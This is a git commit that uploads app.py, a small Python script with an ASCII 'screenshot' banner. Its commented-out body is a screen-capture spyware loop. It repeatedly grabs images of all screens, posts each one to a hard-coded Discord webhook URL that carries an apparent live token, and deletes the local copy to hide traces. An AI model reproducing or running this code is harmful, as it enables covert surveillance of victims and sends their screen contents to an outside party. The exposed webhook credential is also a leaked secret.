3ef4502dde7c6f4e00b438fe4abc3fe5586de5f3
JKTheRipperTH <69198341+JKTheRipperTH@users.noreply.github.com>
2023-11-19 05:38:23 +0700

    Add files via upload

---
+++ app.py
@@ -0,0 +1,25 @@
+import time ,fade ,os ,requests; from PIL import ImageGrab                                                                                                  
+# print(fade. purplepink( """
+#                                                          ▄▄                       
+#                                                         ███                  ██   
+#                                                          ██                  ██   
+#  ▄██▀███▄██▀██▀███▄███  ▄▄█▀██  ▄▄█▀██▀████████▄  ▄██▀██████████▄   ▄██▀██▄██████ 
+#  ██   ▀▀█▀  ██  ██▀ ▀▀ ▄█▀   ██▄█▀   ██ ██    ██  ██   ▀▀██    ██  ██▀   ▀██ ██   
+#  ▀█████▄█       ██     ██▀▀▀▀▀▀██▀▀▀▀▀▀ ██    ██  ▀█████▄██    ██  ██     ██ ██   
+#  █▄   ███▄    ▄ ██     ██▄    ▄██▄    ▄ ██    ██  █▄   ████    ██  ██▄   ▄██ ██   
+#  ██████▀█████▀▄████▄    ▀█████▀ ▀█████▀████  ████▄██████▀███  ████▄ ▀█████▀  ▀████
+                                                                                                  
+# """))           
+
+
+
+
+# WEBHOOK_URL, INTERVAL = "https://discord.com/api/webhooks/1091417904370700318/YATrCWgq8NQyqEOT04C2vfmxz-x8WVmGC2JdYtDo-29XiYkhNNDPSc8Osl3Uc9z5nyCl", 30                                                                                                  
+# while True:                                                                                                  
+#     screenshot = ImageGrab. grab(bbox = None, include_layered_windows = True, all_screens = True, xdisplay = None);                                                                                                  
+#     screenshot_filename = "screenshot.png"                                                                                                  
+#     screenshot. save(screenshot_filename);                                                                                                  
+#     with open(screenshot_filename ,"rb") as f: requests. post(WEBHOOK_URL ,data ={"content":"Screenshot taken at {}". format(time. strftime("%Y-%m-%d %H:%M:%S")) }, files ={"file":f} )                                                                                                  
+#     os.remove(screenshot_filename );                                                                                                  
+#     time.sleep(10000)
+    
